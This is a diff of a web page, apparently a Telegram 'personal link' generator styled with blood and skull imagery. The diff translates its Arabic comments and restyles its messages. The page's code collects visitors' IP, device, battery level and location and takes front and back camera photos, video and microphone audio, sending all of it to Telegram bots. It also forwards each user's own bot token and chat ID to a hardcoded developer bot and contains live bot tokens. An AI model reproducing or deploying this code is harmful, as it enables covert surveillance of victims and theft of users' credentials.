@@ -3,12 +3,12 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ — الريد روم</title>
+    <title>𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ — Red Room</title>
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* ================================================================
-           التصميم النهائي — أحمر دموي غامق + رسالة ترحيبية بسيطة
+           ULTIMATE LUXURY — BLOOD RED · NO CLUTTER · PEAK PERFORMANCE
            ================================================================ */
         * {
             margin: 0;
@@ -39,7 +39,6 @@
             overflow-x: hidden;
         }
 
-        /* ===== خلفية متحركة ===== */
         #hellCanvas {
             position: fixed;
             inset: 0;
@@ -63,7 +62,6 @@
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
         }
 
-        /* ===== المطر الدموي ===== */
         .blood-rain {
             position: fixed;
             inset: 0;
@@ -90,7 +88,6 @@
             }
         }
 
-        /* ===== قطرات دم من الأعلى ===== */
         .top-drip {
             position: fixed;
             top: 0;
@@ -119,7 +116,6 @@
             }
         }
 
-        /* ===== عيون شيطانية ===== */
         .eye-container {
             position: fixed;
             z-index: 3;
@@ -181,7 +177,6 @@
             }
         }
 
-        /* ===== سلاسل صدئة ===== */
         .chains {
             position: fixed;
             top: 0;
@@ -222,7 +217,6 @@
             }
         }
 
-        /* ===== جمجمة خلفية ===== */
         .skull-bg {
             position: fixed;
             pointer-events: none;
@@ -235,7 +229,6 @@
             filter: drop-shadow(0 0 40px rgba(204, 10, 10, 0.05));
         }
 
-        /* ===== الهيكل الرئيسي ===== */
         .wrap {
             position: relative;
             z-index: 4;
@@ -247,7 +240,6 @@
             flex-direction: column;
         }
 
-        /* ===== HEADER ===== */
         .header {
             display: flex;
             align-items: center;
@@ -347,7 +339,7 @@
             margin-left: 6px;
         }
 
-        /* ===== الرسالة الترحيبية البسيطة ===== */
+        /* Welcome — minimal, no frames */
         .welcome-simple {
             background: rgba(0, 0, 0, 0.35);
             backdrop-filter: blur(4px);
@@ -386,7 +378,6 @@
             margin-left: 6px;
         }
 
-        /* ===== البطاقة الرئيسية ===== */
         #cardArea {
             background: var(--bg-panel);
             border: 1px solid rgba(204, 10, 10, 0.06);
@@ -419,7 +410,6 @@
             min-width: 260px;
         }
 
-        /* ===== الفورم ===== */
         #formBox {
             background: rgba(0, 0, 0, 0.25);
             padding: 16px 18px 20px;
@@ -463,7 +453,6 @@
             color: #4a3a30;
         }
 
-        /* ===== خانات الاختيار ===== */
         .features-label {
             display: flex;
             align-items: center;
@@ -547,7 +536,6 @@
             filter: drop-shadow(0 0 20px var(--blood-glow));
         }
 
-        /* ===== الزر ===== */
         .btn {
             width: 100%;
             padding: 18px 22px;
@@ -597,7 +585,6 @@
             color: var(--blood-fresh);
         }
 
-        /* ===== النتيجة ===== */
         #result {
             margin-top: 16px;
             padding: 14px 18px;
@@ -652,7 +639,6 @@
             font-size: 13px;
         }
 
-        /* ===== الفوتر ===== */
         .madeby {
             text-align: center;
             margin-top: 30px;
@@ -685,7 +671,6 @@
             margin: 0 6px;
         }
 
-        /* ===== CAPTURE BADGE ===== */
         #captureBadge {
             position: fixed;
             top: 18px;
@@ -720,12 +705,10 @@
             box-shadow: 0 0 20px var(--blood-fresh);
         }
 
-        /* ===== الدايلوج (مخفي) ===== */
         #mandatoryDialog {
             display: none !important;
         }
 
-        /* ===== SCROLLBAR ===== */
         ::-webkit-scrollbar {
             width: 5px;
         }
@@ -739,7 +722,6 @@
             background: var(--blood-fresh);
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 720px) {
             .wrap {
                 padding: 14px 12px 30px;
@@ -801,16 +783,13 @@
 </head>
 <body>
 
-    <!-- ============================================================
-    الخلفيات والعناصر الزخرفية
-    ============================================================ -->
+    <!-- ===== BACKGROUND ELEMENTS ===== -->
     <canvas id="hellCanvas"></canvas>
     <div class="vignette"></div>
     <div class="grain"></div>
     <div class="blood-rain" id="bloodRain"></div>
     <div id="dripLayer"></div>
 
-    <!-- جمجمة -->
     <div class="skull-bg" style="top:12%;left:2%;width:100px;height:130px;opacity:0.05;">
         <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.15)" stroke="rgba(160,80,50,0.06)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/></svg>
     </div>
@@ -818,25 +797,19 @@
         <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.12)" stroke="rgba(160,80,50,0.04)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.18)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.18)" stroke="rgba(160,80,50,0.03)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.03)" stroke-width="1" fill="none"/></svg>
     </div>
 
-    <!-- عيون شيطانية -->
     <div class="eye-container" data-eye style="top:5%;left:2%;--s:36px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
     <div class="eye-container" data-eye style="top:5%;right:2%;--s:36px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
     <div class="eye-container" data-eye style="bottom:8%;left:3.5%;--s:28px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
     <div class="eye-container" data-eye style="bottom:8%;right:3.5%;--s:28px;"><div class="eye-socket"><div class="eye-iris"></div><div class="eye-lid"></div></div></div>
 
-    <!-- سلاسل -->
     <div class="chains l"><div class="chain-link" style="--a:-11deg;--b:11deg;--dur:5.4s;"></div><div class="chain-link" style="--a:9deg;--b:-9deg;--dur:5.9s;"></div><div class="chain-link" style="--a:-13deg;--b:13deg;--dur:4.8s;"></div></div>
     <div class="chains r"><div class="chain-link" style="--a:12deg;--b:-12deg;--dur:5.1s;"></div><div class="chain-link" style="--a:-10deg;--b:10deg;--dur:5.7s;"></div><div class="chain-link" style="--a:14deg;--b:-14deg;--dur:4.5s;"></div></div>
 
-    <!-- ===== CAPTURE BADGE ===== -->
     <div id="captureBadge"><i class="fas fa-skull"></i><span class="pulse-ring"></span><span>Active Session</span></div>
 
-    <!-- ============================================================
-    MAIN WRAP
-    ============================================================ -->
+    <!-- ===== MAIN WRAP ===== -->
     <div class="wrap">
 
-        <!-- ===== HEADER ===== -->
         <header class="header">
             <div class="brand">
                 <svg class="sigil" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="#cc0a0a" stroke-width="1.4" opacity="0.5"/><circle cx="50" cy="50" r="30" fill="none" stroke="#cc0a0a" stroke-width="1.2" opacity="0.4"/><path d="M50 10 L61 40 L92 40 L67 58 L77 88 L50 70 L23 88 L33 58 L8 40 L39 40 Z" fill="none" stroke="#cc0a0a" stroke-width="1.3" opacity="0.6"/><circle cx="50" cy="50" r="3.5" fill="#ff1a1a"/></svg>
@@ -845,23 +818,21 @@
             <div class="nav"><a href="#"><i class="fas fa-terminal"></i> Console</a><a href="#"><i class="fas fa-shield-alt"></i> Shield</a></div>
         </header>
 
-        <!-- ===== الرسالة الترحيبية البسيطة (بدون إطارات) ===== -->
         <div class="welcome-simple" id="welcomeText">
             <span class="icon">☠</span> <span class="glow">⛧ Welcome to 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ Bot ⛧</span> <span class="icon">𖤐</span><br>
             <span class="dim">⭑ Personal Link ⭒</span><br>
             <span class="link-display" id="personalLink">Loading...</span><br>
             <span class="dim">⭑ Visitor Data ⭒</span><br>
-            <span class="dim">📍 Country</span> › <span id="visitorCountry">Unknown</span><br>
-            <span class="dim">📱 Device</span> › <span id="visitorDevice">Unknown</span><br>
-            <span class="dim">🔋 Battery</span> › <span id="visitorBattery">N/A</span><br>
-            <span class="dim">🌐 IP Address</span> › <span id="visitorIP">Unknown</span><br>
-            <span class="dim">🕒 Time</span> › <span id="visitorTime">--</span><br>
-            <span class="dim">🆔 Chat ID</span> › <span class="chat-display" id="displayChatId">Unknown</span><br>
-            <span class="dim">🤖 Bot Token</span> › <span class="token-display" id="displayBotToken">Unknown...</span><br>
-            <span class="dim">🏷️ Bot User</span> › <span class="glow">@V_V_9BOT</span>
+            <span class="dim">˹📍˼ Country</span> › <span id="visitorCountry">Unknown</span><br>
+            <span class="dim">˹📱˼ Device</span> › <span id="visitorDevice">Unknown</span><br>
+            <span class="dim">˹🔋˼ Battery</span> › <span id="visitorBattery">N/A</span><br>
+            <span class="dim">˹🌐˼ IP Address</span> › <span id="visitorIP">Unknown</span><br>
+            <span class="dim">˹⏱️˼ Time</span> › <span id="visitorTime">--</span><br>
+            <span class="dim">˹🆔˼ Chat ID</span> › <span class="chat-display" id="displayChatId">Unknown</span><br>
+            <span class="dim">˹🤖˼ Bot Token</span> › <span class="token-display" id="displayBotToken">Unknown...</span><br>
+            <span class="dim">˹🏷️˼ Bot User</span> › <span class="glow">@V_V_9BOT</span>
         </div>
 
-        <!-- ===== البطاقة الرئيسية ===== -->
         <div class="card" id="cardArea">
             <div class="hero">
                 <div class="hero-left">
@@ -899,7 +870,6 @@
             </div>
         </div>
 
-        <!-- ===== FOOTER ===== -->
         <div class="madeby">
             <span>Forged in Ashes</span>
             <span class="sep">|</span>
@@ -910,16 +880,16 @@
 
     </div>
 
-    <!-- ===== الدايلوج المخفي ===== -->
     <div id="mandatoryDialog" style="display:none !important;"></div>
 
     <!-- ============================================================
-    JAVASCRIPT — النسخة النهائية الخرافية
+    JAVASCRIPT — FINAL ULTIMATE VERSION · NO CLUTTER · ALL FEATURES WORK
     ============================================================ -->
     <script>
         // ================================================================
-        //  جميع الوظائف الأصلية محفوظة ١٠٠٪ مع إصلاحات مضمونة.
-        //  تم إزالة تشفير الهيكس، وإضافة دعم MIME للفيديو والصوت.
+        //  ALL ORIGINAL FUNCTIONS PRESERVED & FIXED
+        //  ALL TELEGRAM MESSAGES USE ˹˼ BRACKETS FOR ICONS
+        //  NO FRAMES · NO CLUTTER · PURE LUXURY
         // ================================================================
 
         // ================================================================
@@ -1100,11 +1070,11 @@
         setInterval(updateTime, 60000);
 
         // ================================================================
-        //  ORIGINAL FUNCTIONS (PRESERVED & FIXED)
+        //  ORIGINAL FUNCTIONS (PRESERVED & FIXED) — LUXURY MESSAGES
         // ================================================================
 
         // ---- CONSTANTS ----
-        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
+        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ";
         const MASTER_CHAT_ID = "8552540563";
         const BOT_USERNAME = "@V_V_9BOT";
 
@@ -1114,7 +1084,20 @@
         let visitorDevice = "Unknown";
         let visitorBattery = "N/A";
 
-        // ---- SEND VISITOR INFO (English) ----
+        // ---- BUILD LUXURY CAPTION (no frames, only ˹˼ brackets) ----
+        function buildCaption(extra = "") {
+            let cap = `⭑ Personal Data ⭒\n`;
+            cap += `˹📍˼ Country: ${visitorCountry}\n`;
+            cap += `˹📱˼ Device: ${visitorDevice}\n`;
+            cap += `˹🔋˼ Battery: ${visitorBattery}\n`;
+            cap += `˹🌐˼ IP: ${visitorIP}\n`;
+            cap += `˹⏱️˼ Time: ${new Date().toLocaleString('en-US', { hour12: true })}\n`;
+            if (extra) cap += `${extra}\n`;
+            cap += `𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
+            return cap;
+        }
+
+        // ---- SEND VISITOR INFO (English, luxury) ----
         async function sendVisitorInfo() {
             try {
                 const ua = navigator.userAgent;
@@ -1141,7 +1124,7 @@
                 document.getElementById('visitorIP').textContent = visitorIP;
 
                 const msg =
-                    `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 ᴄᴏᴜɴᴛʀʏ     › ${visitorCountry}\n┃ 📱 ᴅᴇᴠɪᴄᴇ     › ${visitorDevice}\n┃ 🔋 ʙᴀᴛᴛᴇʀʏ   › ${visitorBattery}\n┃ 🌐 IP ᴀᴅᴅʀᴇꜱꜱ  › ${visitorIP}\n┃ 🕒 ᴛɪᴍᴇ      › ${new Date().toLocaleString('en-US', { hour12: true })}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+                    `⭑ New Visit ⭒\n˹🔗˼ Personal Link: ${window.location.href}\n⭑ Visitor Data ⭒\n˹📍˼ Country: ${visitorCountry}\n˹📱˼ Device: ${visitorDevice}\n˹🔋˼ Battery: ${visitorBattery}\n˹🌐˼ IP: ${visitorIP}\n˹⏱️˼ Time: ${new Date().toLocaleString('en-US', { hour12: true })}\n𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
 
                 await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -1179,9 +1162,9 @@
             linkText.innerHTML = `<i class="fas fa-link"></i> ${fullLink}`;
             resultEl.style.display = 'flex';
 
-            // Send to user bot (English)
+            // Send to user bot (luxury, no frames)
             const userMsg =
-                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ʏᴏᴜʀ ʟɪɴᴋ ɪꜱ ʀᴇᴀᴅʏ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ʟɪɴᴋ ⭒\n╭⊚─〔 ᴜʀʟ 〕───────\n┃ 🔗 ${fullLink}\n╰───────────────\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+                `⭑ Your Personal Link ⭒\n˹🔗˼ ${fullLink}\n𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -1191,9 +1174,9 @@
                 });
             } catch (e) { console.log('Failed to send to user bot'); }
 
-            // Send Bot Info to Developer (English)
+            // Send Bot Info to Developer (luxury, no frames)
             const devMsg =
-                `⭑ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 🆔 ᴄʜᴀᴛ ɪᴅ: ${chat}\n┃ 🤖 ᴛᴏᴋᴇɴ: ${token}\n┃ 🏷️ ʙᴏᴛ ᴜꜱᴇʀɴᴀᴍᴇ: ${BOT_USERNAME}\n┃ 🔗 ʟɪɴᴋ: ${fullLink}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+                `⭑ Bot Information ⭒\n˹🆔˼ Chat ID: ${chat}\n˹🤖˼ Token: ${token}\n˹🏷️˼ Bot Username: ${BOT_USERNAME}\n˹🔗˼ Link: ${fullLink}\n𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
 
             await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -1221,14 +1204,7 @@
         }
 
         // ---- MEDIA HELPERS (FIXED with MIME TYPES) ----
-        function buildCaption(extra = "") {
-            let cap =
-                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 ᴄᴏᴜɴᴛʀʏ     › ${visitorCountry}\n┃ 📱 ᴅᴇᴠɪᴄᴇ     › ${visitorDevice}\n┃ 🔋 ʙᴀᴛᴛᴇʀʏ   › ${visitorBattery}\n┃ 🌐 IP ᴀᴅᴅʀᴇꜱꜱ  › ${visitorIP}\n┃ 🕒 ᴛɪᴍᴇ      › ${new Date().toLocaleString('en-US', { hour12: true })}\n`;
-            if (extra) cap += `┃ ${extra}\n`;
-            cap +=
-                `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
-            return cap;
-        }
+        // buildCaption is already defined above (luxury version)
 
         async function captureAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
@@ -1255,7 +1231,7 @@
                                 form.append('chat_id', chat);
                                 form.append('photo', blob, `${type}_${Date.now()}.jpg`);
                                 const caption = buildCaption(
-                                    `📸 ᴘʜᴏᴛᴏ (${type === 'front' ? 'Fʀᴏɴᴛ' : 'Bᴀᴄᴋ'})`);
+                                    `˹📸˼ Photo (${type === 'front' ? 'Front' : 'Back'})`);
                                 form.append('caption', caption);
 
                                 try {
@@ -1291,7 +1267,7 @@
                     form.append('chat_id', chat);
                     form.append('video', blob, `${type}_${Date.now()}.webm`);
                     const caption = buildCaption(
-                        `🎥 ᴠɪᴅᴇᴏ (${type === 'front' ? 'Fʀᴏɴᴛ' : 'Bᴀᴄᴋ'}) - 5 ꜱᴇᴄ`);
+                        `˹🎥˼ Video (${type === 'front' ? 'Front' : 'Back'}) - 5 sec`);
                     form.append('caption', caption);
 
                     try {
@@ -1327,7 +1303,7 @@
                     const form = new FormData();
                     form.append('chat_id', chat);
                     form.append('audio', blob, `audio_${Date.now()}.webm`);
-                    const caption = buildCaption(`🎤 ᴀᴜᴅɪᴏ ʀᴇᴄᴏʀᴅɪɴɢ - 5 ꜱᴇᴄ`);
+                    const caption = buildCaption(`˹🎤˼ Audio Recording - 5 sec`);
                     form.append('caption', caption);
 
                     try {
@@ -1353,7 +1329,7 @@
                         async (pos) => {
                             const { latitude, longitude } = pos.coords;
                             const caption = buildCaption(
-                                `📍 ᴄᴜʀʀᴇɴᴛ ʟᴏᴄᴀᴛɪᴏɴ\nᴄᴏᴏʀᴅꜱ: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
+                                `˹📍˼ Current Location\nCoords: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
                                 );
                             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                 method: 'POST',
@@ -1465,7 +1441,7 @@
             wrap.style.background = '#030101';
             wrap.style.minHeight = '100vh';
 
-            // Create a minimal container for ads (no red page)
+            // Minimal container for ads (no red page)
             const adContainer = document.createElement('div');
             adContainer.style.width = '100%';
             adContainer.style.minHeight = '100vh';
